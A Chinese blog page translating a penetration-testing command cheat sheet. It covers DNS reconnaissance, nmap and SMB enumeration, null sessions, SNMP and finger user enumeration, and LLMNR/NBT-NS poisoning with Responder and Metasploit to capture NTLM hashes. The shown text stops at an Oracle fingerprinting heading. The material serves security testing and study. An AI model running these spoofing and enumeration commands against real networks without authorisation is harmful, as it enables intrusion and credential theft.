<!DOCTYPE html>




<html class="theme-next gemini" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">









  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">






<meta name="description" content="渗透测试工具备忘录本文翻译自 Penetration Testing Tools Cheat Sheet  ，首发先知社区 ，转载请注明链接。 简介渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。 本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参">
<meta property="og:type" content="article">
<meta property="og:title" content="【译】渗透测试工具备忘录">
<meta property="og:url" content="https://findneo.github.io/180727PenetrationTool/index.html">
<meta property="og:site_name" content="闲言语">
<meta property="og:description" content="渗透测试工具备忘录本文翻译自 Penetration Testing Tools Cheat Sheet  ，首发先知社区 ，转载请注明链接。 简介渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。 本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-01-25T23:21:37.053Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【译】渗透测试工具备忘录">
<meta name="twitter:description" content="渗透测试工具备忘录本文翻译自 Penetration Testing Tools Cheat Sheet  ，首发先知社区 ，转载请注明链接。 简介渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。 本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://findneo.github.io/180727PenetrationTool/">





  <title>【译】渗透测试工具备忘录 | 闲言语</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">闲言语</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180727PenetrationTool/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="findneo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闲言语">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">【译】渗透测试工具备忘录</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-25T15:01:56+08:00">
                2018-07-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="渗透测试工具备忘录"><a href="#渗透测试工具备忘录" class="headerlink" title="渗透测试工具备忘录"></a>渗透测试工具备忘录</h1><p><strong>本文翻译自 <a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="noopener">Penetration Testing Tools Cheat Sheet </a> ，首发<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 <a href="https://highon.coffee/blog/" target="_blank" rel="noopener">本站</a> 其他备忘录。</p>
<p>本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。</p>
<p>文中缺漏之处欢迎 <a href="https://twitter.com/Arr0way" target="_blank" rel="noopener">推特</a> 私戳。</p>
<h3 id="更新日志："><a href="#更新日志：" class="headerlink" title="更新日志："></a>更新日志：</h3><p>17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。</p>
<h2 id="开始前"><a href="#开始前" class="headerlink" title="开始前"></a>开始前</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><h4 id="设置IP-地址"><a href="#设置IP-地址" class="headerlink" title="设置IP 地址"></a>设置IP 地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure>
<h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcalc xxx.xxx.xxx.xxx/24 </span><br><span class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0</span><br></pre></td></tr></table></figure>
<h2 id="公开来源情报"><a href="#公开来源情报" class="headerlink" title="公开来源情报"></a>公开来源情报</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-枚举"><a href="#WHOIS-枚举" class="headerlink" title="WHOIS 枚举"></a>WHOIS 枚举</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois domain-name-here.com</span><br></pre></td></tr></table></figure>
<h5 id="查询DNS-IP"><a href="#查询DNS-IP" class="headerlink" title="查询DNS IP"></a>查询DNS IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure>
<h5 id="查询MX记录"><a href="#查询MX记录" class="headerlink" title="查询MX记录"></a>查询MX记录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure>
<h5 id="用DIG-查询域传送"><a href="#用DIG-查询域传送" class="headerlink" title="用DIG 查询域传送"></a>用DIG 查询域传送</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure>
<h2 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h2><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td>
<td>Windows DNS域传送</td>
</tr>
<tr>
<td><code>dig axfr blah.com @ns1.blah.com</code></td>
<td>Linux DNS 域传送</td>
</tr>
</tbody>
</table>
<h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><h4 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h4><p>使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/killswitch-GUI/SimplyEmail.git</span><br><span class="line">./SimplyEmail.py -all -e TARGET-DOMAIN</span><br></pre></td></tr></table></figure>
<h3 id="半主动信息收集"><a href="#半主动信息收集" class="headerlink" title="半主动信息收集"></a>半主动信息收集</h3><h4 id="基本指纹识别"><a href="#基本指纹识别" class="headerlink" title="基本指纹识别"></a>基本指纹识别</h4><p>手动指纹识别/banner抓取</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nc -v 192.168.1.1 25</code> <br><code>telnet 192.168.1.1 25</code></td>
<td>通过显示banner识别版本和指纹</td>
</tr>
</tbody>
</table>
<h4 id="使用NC抓取banner"><a href="#使用NC抓取banner" class="headerlink" title="使用NC抓取banner"></a>使用NC抓取banner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc TARGET-IP 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: TARGET-IP</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referrer: meh-domain</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure>
<h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="DNS-爆破"><a href="#DNS-爆破" class="headerlink" title="DNS 爆破"></a>DNS 爆破</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><table>
<thead>
<tr>
<th>DNS Enumeration Kali - DNSRecon</th>
</tr>
</thead>
<tbody>
<tr>
<td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml</td>
</tr>
</tbody>
</table>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="Nmap命令"><a href="#Nmap命令" class="headerlink" title="Nmap命令"></a>Nmap命令</h5><p>更多命令，详见 <a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" rel="noopener">Nmap备忘录</a> 。</p>
<p>基本Nmap 命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nmap -v -sS -A -T4 target</code></td>
<td>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪</td>
</tr>
<tr>
<td><code>nmap -v -sS -p--A -T4 target</code></td>
<td>同上，且扫描所有TCP端口，耗时更长</td>
</tr>
<tr>
<td><code>nmap -v -sU -sS -p- -A -T4 target</code></td>
<td>同上，且扫描所有UDP端口，耗时巨长</td>
</tr>
<tr>
<td><code>nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X</code></td>
<td>扫描可能包含漏洞的SMB服务</td>
</tr>
<tr>
<td>` ls /usr/share/nmap/scripts/*</td>
<td>grep ftp `</td>
<td>利用关键字搜索nmap脚本</td>
</tr>
</tbody>
</table>
<p>别在外网采用<code>T4</code> 扫描，使用<code>TCP</code> 连接扫描时用<code>T2</code> 比较合适。<code>T4</code> 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用<code>T4/T5</code> 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。</p>
<h6 id="Nmap-UDP扫描"><a href="#Nmap-UDP扫描" class="headerlink" title="Nmap UDP扫描"></a>Nmap UDP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU TARGET</span><br></pre></td></tr></table></figure>
<h6 id="UDP-协议扫描器"><a href="#UDP-协议扫描器" class="headerlink" title="UDP 协议扫描器"></a>UDP 协议扫描器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</span><br></pre></td></tr></table></figure>
<p>扫描文件中IP地址的所有服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -f ip.txt</span><br></pre></td></tr></table></figure>
<p>扫描特定UDP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure>
<h6 id="其他主机发现"><a href="#其他主机发现" class="headerlink" title="其他主机发现"></a>其他主机发现</h6><p>不使用nmap发现主机的方法：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>netdiscover -r 192.168.1.0/24</code></td>
<td>利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商</td>
</tr>
</tbody>
</table>
<h2 id="枚举和攻击网络服务"><a href="#枚举和攻击网络服务" class="headerlink" title="枚举和攻击网络服务"></a>枚举和攻击网络服务</h2><p>用于识别/枚举网络服务的工具。</p>
<h3 id="SAMB-SMB-Windows-域枚举"><a href="#SAMB-SMB-Windows-域枚举" class="headerlink" title="SAMB / SMB / Windows 域枚举"></a>SAMB / SMB / Windows 域枚举</h3><h4 id="Samba枚举"><a href="#Samba枚举" class="headerlink" title="Samba枚举"></a>Samba枚举</h4><h5 id="SMB枚举工具"><a href="#SMB枚举工具" class="headerlink" title="SMB枚举工具"></a>SMB枚举工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure>
<p>当然也可参考本站的 <a href="https://highon.coffee/blog/nbtscan-cheat-sheet/" target="_blank" rel="noopener">nbtscan 的速查表</a> </p>
<h5 id="SMB-版本指纹识别"><a href="#SMB-版本指纹识别" class="headerlink" title="SMB 版本指纹识别"></a>SMB 版本指纹识别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.100</span><br></pre></td></tr></table></figure>
<h5 id="寻找开放的SMB共享"><a href="#寻找开放的SMB共享" class="headerlink" title="寻找开放的SMB共享"></a>寻找开放的SMB共享</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24</span><br></pre></td></tr></table></figure>
<h5 id="枚举SMB用户"><a href="#枚举SMB用户" class="headerlink" title="枚举SMB用户"></a>枚举SMB用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</span><br></pre></td></tr></table></figure>
<p>RID循环（RID Cycling ）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</span><br></pre></td></tr></table></figure>
<p>Metasploit的RID循环攻击模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure>
<h6 id="手动测试空会话"><a href="#手动测试空会话" class="headerlink" title="手动测试空会话"></a>手动测试空会话</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">smbclient -L //192.168.99.131</span><br></pre></td></tr></table></figure>
<h6 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h6><p>在Kali上安装使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nbtscan-unixwiz </span><br><span class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</span><br></pre></td></tr></table></figure>
<h4 id="LLMNR-NBT-NS欺骗"><a href="#LLMNR-NBT-NS欺骗" class="headerlink" title="LLMNR / NBT-NS欺骗"></a>LLMNR / NBT-NS欺骗</h4><p>从网络中窃取凭证</p>
<h5 id="使用Metasploit进行-LLMNR-NetBIOS请求"><a href="#使用Metasploit进行-LLMNR-NetBIOS请求" class="headerlink" title="使用Metasploit进行 LLMNR / NetBIOS请求"></a>使用Metasploit进行 LLMNR / NetBIOS请求</h5><p>欺骗/毒化 LLMNR / NetBIOS请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/spoof/llmnr/llmnr_response</span><br><span class="line">auxiliary/spoof/nbns/nbns_response</span><br></pre></td></tr></table></figure>
<p>抓取哈希</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/capture/smb</span><br><span class="line">auxiliary/server/capture/http_ntlm</span><br></pre></td></tr></table></figure>
<p>最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。</p>
<h5 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h5><p>你也可以选择使用 responder</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SpiderLabs/Responder.git</span><br><span class="line">python Responder.py -i local-ip -I eth0</span><br></pre></td></tr></table></figure>
<p>注：整个渗透测试过程可以一直允许Responder.py</p>
<h4 id="SNMP枚举工具"><a href="#SNMP枚举工具" class="headerlink" title="SNMP枚举工具"></a>SNMP枚举工具</h4><p>SNMP枚举工具有很多。</p>
<p>美化SNMP输出结果使易于阅读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp-mibs-downloader download-mibs</span><br><span class="line">echo &quot;&quot; &gt; /etc/snmp/snmp.conf</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>snmpcheck -t 192.168.1.X -c public</code><br>` snmpwalk -c public -v1 192.168.1.X 1</td>
<td>grep hrSWRunName</td>
<td>cut -d<em> </em> -f  <code>&lt;br /&gt;</code> snmpenum -t 192.168.1.X <code>&lt;br /&gt;</code> onesixtyone -c names -i hosts `</td>
<td>SNMP枚举</td>
</tr>
</tbody>
</table>
<h5 id="SNMPv3枚举工具"><a href="#SNMPv3枚举工具" class="headerlink" title="SNMPv3枚举工具"></a>SNMPv3枚举工具</h5><p>使用nmap识别SNMPv3服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 161 --script=snmp-info TARGET-SUBNET</span><br></pre></td></tr></table></figure>
<p>Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp snmp-mibs-downloader</span><br><span class="line">wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</span><br></pre></td></tr></table></figure>
<p>注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">在GitHub上的安全列表</a> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</span><br></pre></td></tr></table></figure>
<h4 id="远程服务枚举"><a href="#远程服务枚举" class="headerlink" title="远程服务枚举"></a>远程服务枚举</h4><p>这已是老生常谈，但为了本文内容的全面还是包含如下。</p>
<p><code>nmap -A</code> 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。</p>
<h5 id="RSH-枚举"><a href="#RSH-枚举" class="headerlink" title="RSH 枚举"></a>RSH 枚举</h5><h6 id="RSH运行命令"><a href="#RSH运行命令" class="headerlink" title="RSH运行命令"></a>RSH运行命令</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsh &lt;target&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure>
<h6 id="MetasploitRSH-登陆扫描"><a href="#MetasploitRSH-登陆扫描" class="headerlink" title="MetasploitRSH 登陆扫描"></a>MetasploitRSH 登陆扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure>
<h6 id="使用rusers显示已登陆用户"><a href="#使用rusers显示已登陆用户" class="headerlink" title="使用rusers显示已登陆用户"></a>使用rusers显示已登陆用户</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rusers -al 192.168.2.1</span><br></pre></td></tr></table></figure>
<h6 id="使用rlogin扫描整个子网"><a href="#使用rlogin扫描整个子网" class="headerlink" title="使用rlogin扫描整个子网"></a>使用rlogin扫描整个子网</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &lt;user&gt; &lt;target&gt;</span><br><span class="line">e.g rlogin -l root TARGET-SUBNET/24</span><br></pre></td></tr></table></figure>
<h4 id="使用finger枚举"><a href="#使用finger枚举" class="headerlink" title="使用finger枚举"></a>使用finger枚举</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finger @TARGET-IP</span><br><span class="line">finger batman@TARGET-IP</span><br></pre></td></tr></table></figure>
<h5 id="利用Solaris的bug显示所有已登录用户"><a href="#利用Solaris的bug显示所有已登录用户" class="headerlink" title="利用Solaris的bug显示所有已登录用户"></a>利用Solaris的bug显示所有已登录用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">finger 0@host  </span><br><span class="line"></span><br><span class="line">SunOS: RPC services allow user enum:</span><br><span class="line">$ rusers # users logged onto LAN</span><br><span class="line"></span><br><span class="line">finger &apos;a b c d e f g h&apos;@sunhost</span><br></pre></td></tr></table></figure>
<h4 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h4><p>使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。</p>
<h2 id="TLS-amp-SSL-测试"><a href="#TLS-amp-SSL-测试" class="headerlink" title="TLS&amp;SSL 测试"></a>TLS&amp;SSL 测试</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>测试单一主机并将结果输出的HTML文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html</span><br></pre></td></tr></table></figure>
<h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>在Kali Rolling上安装OpenVAS 8 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br></pre></td></tr></table></figure>
<p>确认openvas  正在运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn</span><br></pre></td></tr></table></figure>
<p>通过<code>https://127.0.0.1:9392</code> 登陆openvas，密码是在安装时设置好的。</p>
<h2 id="数据库渗透测试"><a href="#数据库渗透测试" class="headerlink" title="数据库渗透测试"></a>数据库渗透测试</h2><p>攻击暴露在互联网上的数据库。</p>
<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>安装 oscanner：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install oscanner</span><br></pre></td></tr></table></figure>
<p>运行 oscanner：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s 192.168.1.200 -P 1521</span><br></pre></td></tr></table></figure>
<h4 id="Oracle-TNS版本指纹识别"><a href="#Oracle-TNS版本指纹识别" class="headerlink" title="Oracle TNS版本指纹识别"></a>Oracle TNS版本指纹识别</h4><p>安装 tnscmd10g ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tnscmd10g</span><br></pre></td></tr></table></figure>
<p>识别：</p>
